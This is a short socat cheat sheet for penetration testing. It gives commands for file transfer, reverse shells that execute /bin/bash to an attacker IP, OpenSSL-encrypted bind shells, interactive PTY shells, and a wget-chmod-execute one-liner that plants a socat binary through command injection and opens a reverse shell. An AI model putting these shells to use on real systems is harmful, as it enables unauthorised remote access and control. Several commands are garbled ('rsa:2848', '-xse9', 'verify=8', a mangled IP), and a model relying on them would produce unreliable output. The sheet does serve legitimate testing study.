# Socat

## connect

```text
socat - TCP4:[ip]:[port] 
socat TCP4-LISTEN:[port] STDOUT
```

## file transfer

```text
sudo socat TCP4-LISTEN:443,fork file:file.txt
socat TCP4:18.11.8.4:443 file:file.txt,create
```

## reverse shell

```text
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:18.11.8.22:443 EXEC:/bin/bash
```

## Encrypted Bind Shells

​​create a cert with openssl:

```text
openssl req -newkey rsa:2848 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

```text
req: initiate a new certificate signing request
-newkey: generate a new private key
rsa:2848: use RSA encryption with a 2,048-bit key length.
-nodes: store the private key without passphrase protection
-keyout: save the key to a file
-xse9: output a self-signed certificate instead of a certificate request
-days: set validity period in days
-out: save the certificate to a file
```

​merge two files to create a usable pem file for socat:

```text
cat bind_shett.key bind_shett.crt > bind_shett.pem

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=e,fork EXEC:/bin
/bash

socat - OPENSSL:1e.11. e .4:443,verify=8
```

## intractive shell Using socat

```text
socat file:`tty`,raw,echo=0 tcp-listen:4444 → attacker
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  → host
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

{% embed url="https://github.com/andrew-d/static-binaries" %}

With a command injection vuln, it’s possible to download the correct architecture socat binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```text
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```












